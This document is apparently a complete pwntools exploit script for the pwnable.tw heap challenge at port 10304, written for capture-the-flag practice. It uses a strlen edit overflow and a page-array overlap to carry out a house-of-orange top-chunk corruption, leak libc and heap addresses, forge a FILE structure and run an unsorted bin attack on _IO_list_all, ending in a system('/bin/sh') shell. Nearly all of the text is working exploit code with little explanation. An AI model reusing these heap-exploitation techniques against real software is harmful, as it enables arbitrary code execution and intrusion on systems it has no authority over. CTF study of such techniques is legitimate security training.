from pwn import *

#r = process("./B", env={"LD_PRELOAD" : "./libc_64.so.6"})
r = remote('chall.pwnable.tw',10304)
def edit_author(name):
    r.sendafter(b'Author :',name)

def add(size,content):
    r.sendafter(b'Your choice :',b'1')
    r.sendafter(b'page :',str(size))
    r.sendafter(b'Content :',content)

def view(idx):
    r.sendafter(b'Your choice :',b'2')
    r.sendafter(b'page :',str(idx))

def edit(idx,content):
    r.sendafter(b'Your choice :',b'3')
    r.sendafter(b'page :',str(idx))
    r.sendafter(b'Content:',content)

def information():
    r.sendafter(b'Your choice :',b'4')

author_addr = 0x602060
### vuln1 : edit function use strlen() to decide size of edit page, it will cause overflow to next chunk size.
### vuln2 : can add 9 page and &page[8] == &page_size[0], so if we change page_size[0] == 0, we can overwrite it to a heap addr
edit_author(b'123')
add(0x20,b'123') #0 
add(0x18,b'a'*0x18) #1
## use strlen vuln to overwrite top chunk size
edit(1,b'b'*0x18)  
edit(1,b'c'*0x18 + b'\xb1\x1f\x00')

### house of orange to get unsorted bin 
add(0x2000,b'1') #2

### leak libc
add(0x408,b'a'*8) #3
view(3)
r.recvuntil(b'aaaaaaaa')
libc = u64(r.recv(6)+b'\x00\x00') - 0x3c4208
success(f'libc : {hex(libc)}')

### leak heap base 
edit(3,b'c'*0x0f + b'a')
view(3)
r.recvuntil(b'ca')
heap_base = u64(r.recv(4)+b'\x00'*4) - 0x50
success(f'heap : {hex(heap_base)}')

### overflow page_size[0]
edit(0,b'\x00')
for _ in range(5):
    add(0x18,b'0')

### unsorted bin attack 
io_list_all = libc + 0x3c4520
system = libc + 0x45390
vtable_addr = heap_base + 0x5e0
 
padding = b'a'*0x4f0
payload = b'/bin/sh\x00'
payload += p64(0x60)  ## size 
payload += p64(0) + p64(io_list_all-0x10) #unsorted bin attack
payload += p64(0) + p64(1)   ### io_write_ptr > io_write_base
payload = payload.ljust(0xd8,b'\x00')
payload += p64(vtable_addr) # 
payload += p64(0)*3 + p64(system)
edit(0,padding + payload)
edit(0,b'\x00')

r.sendafter(b'Your choice :',b'1')
#r.sendafter(b'page :',b'500')
r.interactive()